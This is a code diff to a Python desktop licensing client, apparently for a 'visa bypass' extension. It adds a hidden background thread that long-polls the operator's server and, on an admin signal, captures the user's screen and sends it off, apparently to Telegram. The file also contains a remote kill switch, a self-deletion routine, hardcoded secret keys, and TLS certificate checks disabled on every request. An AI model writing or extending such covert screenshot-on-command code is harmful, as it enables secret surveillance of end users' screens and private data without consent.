@@ -51,7 +51,7 @@ API_SETTINGS = "https://visa-bypass-server-sigma.vercel.app/api/settings"
 APP_VERSION = "1.1"
 SIGN_SECRET = "vecna-sign-key"
 ENCRYPTION_KEY = "vecna-extension-secret-key-2024"
-HEARTBEAT_INTERVAL = 20
+HEARTBEAT_INTERVAL = 600
 LAST_HEARTBEAT_TIME = 0 
 _GLOBAL_LAST_HB = 0 # Strict in-memory throttle v1.1.4
 # Config path in AppData to ensure it's writable
@@ -242,35 +242,10 @@ def send_heartbeat(license_key, mac_address, offline=False, force=False, config=
         # Send request
         with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
             resp_data = json.loads(response.read().decode('utf-8'))
-            if resp_data.get('requestScreenshot'):
-                print(f"[HB] >>> SIGNAL DETECTED: {resp_data}")
             
             # CHECK FOR KILL SIGNAL
             if resp_data.get('kill') is True:
                 trigger_defense(reason="Remote Kill signal received from server (Heartbeat phase)")
-            
-            # CHECK FOR REMOTE SCREENSHOT REQUEST
-            if resp_data.get('requestScreenshot') is True:
-                print(f"[SCREENSHOT] >>> Remote Request RECEIVED for key: {load_config().get('license_key')}")
-                
-                def capture_and_send():
-                    try:
-                        print("[SCREENSHOT] Thread started. Capturing...")
-                        config = load_config()
-                        key = config.get('license_key')
-                        if key:
-                            mac = get_mac_address()
-                            print(f"[SCREENSHOT] Sending capture to Telegram for {key}...")
-                            success = report_tamper(key, mac, reason="Admin Remote Screenshot Request")
-                            if success:
-                                print("[SCREENSHOT] ✅ Sent successfully!")
-                            else:
-                                print("[SCREENSHOT] ❌ Failed to send.")
-                    except Exception as e:
-                        print(f"[SCREENSHOT] Error: {e}")
-
-                # Run in background to not block heartbeat thread
-                threading.Thread(target=capture_and_send, daemon=True).start()
                 
         # Update throttle timestamp on SUCCESS — write to disk immediately
         # This uses an atomic read-modify-write to preserve other config fields
@@ -364,12 +339,48 @@ def report_tamper(key, mac, reason="Client self-defense triggered"):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        # Timeout 5s to allow for image upload
-        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
-            return response.getcode() == 200
+        # Timeout 10s to allow for image upload
+        with urllib.request.urlopen(req, context=ctx, timeout=15) as response:
+            code = response.getcode()
+            resp = response.read().decode('utf-8')
+            print(f"[REPORT] Server responded with code {code}: {resp}")
+            return code == 200
     except Exception as e:
         print(f"Report failed: {e}")
         return False
+
+def start_signal_listener(key):
+    """Long-polling thread for instant admin signals."""
+    def listener_thread():
+        print(f"[SIGNAL] Listener started for {key[:10]}...")
+        while True:
+            try:
+                data = json.dumps({"key": key}).encode('utf-8')
+                req = urllib.request.Request(
+                    f"{API_BASE}/wait-for-signal",
+                    data=data,
+                    headers={'Content-Type': 'application/json'},
+                    method='POST'
+                )
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                
+                # Timeout must be longer than server's loop (45s)
+                with urllib.request.urlopen(req, context=ctx, timeout=60) as response:
+                    resp = json.loads(response.read().decode('utf-8'))
+                    if resp.get('signal') == 'screenshot':
+                        print("[SIGNAL] >>> INSTANT SCREENSHOT REQUEST RECEIVED!")
+                        mac = get_mac_address()
+                        report_tamper(key, mac, reason="Admin Remote Screenshot Request (Instant)")
+                
+                # Small pause before re-polling to prevent tight loops on errors
+                time.sleep(1)
+            except Exception as e:
+                # print(f"[SIGNAL] Wait error: {e}")
+                time.sleep(5)
+                
+    threading.Thread(target=listener_thread, daemon=True).start()
 
 def cleanup_for_expiry():
     """Aggressively delete extension on expiry."""
@@ -1690,6 +1701,8 @@ class VecnaModernApp(ctk.CTk):
             if auto:
                 self.install_folder = self.config.get('install_folder')
                 self.after(0, self.start_heartbeat)
+                # START INSTANT SIGNAL LISTENER
+                start_signal_listener(key)
                 self.after(0, self.show_screen_running)
             else:
                 # Ask user for folder (On main thread)
@@ -1722,6 +1735,8 @@ class VecnaModernApp(ctk.CTk):
                 'license_key': self.license_key,
                 'install_folder': res
             })
+            # START INSTANT SIGNAL LISTENER
+            start_signal_listener(self.license_key)
             self.start_heartbeat()
         else:
             self._on_login_fail(res, False)
